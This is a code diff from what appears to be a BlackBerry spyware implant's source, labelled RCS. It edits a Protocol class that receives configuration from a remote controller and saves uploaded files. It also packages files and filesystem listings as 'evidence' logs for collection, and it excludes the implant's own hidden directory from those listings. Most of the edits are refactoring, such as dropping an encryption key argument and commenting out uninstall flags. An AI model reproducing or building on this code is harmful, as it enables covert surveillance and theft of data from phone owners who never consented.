@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync;
 
 import java.util.Date;
@@ -21,7 +21,6 @@ import blackberry.action.sync.protocol.CommandException;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
 import blackberry.config.Conf;
-import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -44,8 +43,8 @@ public abstract class Protocol {
 
     protected Transport transport;
 
-    public boolean reload;
-    public boolean uninstall;
+    //public boolean reload;
+    //public boolean uninstall;
 
     public boolean init(Transport transport) {
         this.transport = transport;
@@ -57,8 +56,8 @@ public abstract class Protocol {
 
     public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFile file = new AutoFile(Path.USER()
-                + Path.CONF_DIR + Conf.NEW_CONF, true);
+        final AutoFile file = new AutoFile(Path.USER() + Path.CONF_DIR
+                + Conf.NEW_CONF, true);
 
         file.create();
         final boolean ret = file.write(conf, offset, conf.length - offset);
@@ -67,9 +66,9 @@ public abstract class Protocol {
             debug.error("saveNewConf: cannot write on file: "
                     + file.getFullFilename());
             //#endif
-            
+
             throw new CommandException(); //"write"
-        }else{
+        } else {
             Evidence.info("New configuration received");
         }
 
@@ -77,8 +76,7 @@ public abstract class Protocol {
     }
 
     public static void saveUpload(String filename, byte[] content) {
-        final AutoFile file = new AutoFile(Path.USER() + filename,
-                true);
+        final AutoFile file = new AutoFile(Path.USER() + filename, true);
 
         if (file.exists()) {
             //#ifdef DEBUG
@@ -317,7 +315,7 @@ public abstract class Protocol {
 
         byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
-        Evidence log = new Evidence(false, Encryption.getKeys().getAesKey());
+        Evidence log = new Evidence();
 
         log.createEvidence(additional, EvidenceType.DOWNLOAD);
         log.writeEvidence(content);
@@ -363,7 +361,7 @@ public abstract class Protocol {
     }
 
     public static void saveFilesystem(int depth, String path) {
-        Evidence fsLog = new Evidence(false, Encryption.getKeys().getAesKey());
+        Evidence fsLog = new Evidence();
         fsLog.createEvidence(null, EvidenceType.FILESYSTEM);
 
         // Expand path and create log
@@ -529,8 +527,7 @@ public abstract class Protocol {
                 //#endif
             }
 
-            if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
-                    || dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
+            if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
                 //#ifdef DEBUG
                 debug.warn("expandPath ignoring hidden path: " + dPath);
                 //#endif
